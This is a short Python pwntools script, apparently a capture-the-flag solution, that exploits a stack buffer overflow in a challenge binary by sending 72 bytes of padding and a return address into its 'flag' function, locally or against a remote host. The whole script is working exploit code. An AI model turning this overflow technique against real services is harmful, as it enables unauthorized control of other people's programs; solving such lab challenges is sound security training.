#!/usr/bin/env python3
from pwn import *
from sys import argv

def run():
	if len(argv) == 3:
		context.binary = "./vuln.elf" # We were able to reconstruct well enough, no need for ./vuln
		return remote(argv[1], argv[2])
	else:
		context.binary = "./vuln.elf"
		return process("./vuln.elf")

context.log_level = "error"
cyclicGen = cyclic_gen()

with run() as p:
	# Buffered printf doesn't seem to like the default entry point,
	# need to jump further into flag function so we don't `push %rbp`
	EIP = pack(context.binary.symbols.flag + 0x5)
	payload = cyclicGen.get(72) + EIP

	p.recvuntil(b':')
	p.sendline(payload)

	flag = p.recvall().strip().decode("ascii")

info(f"The flag is: {flag}")
print(flag)

with open("payload", "wb") as payloadFile:
	payloadFile.write(payload)

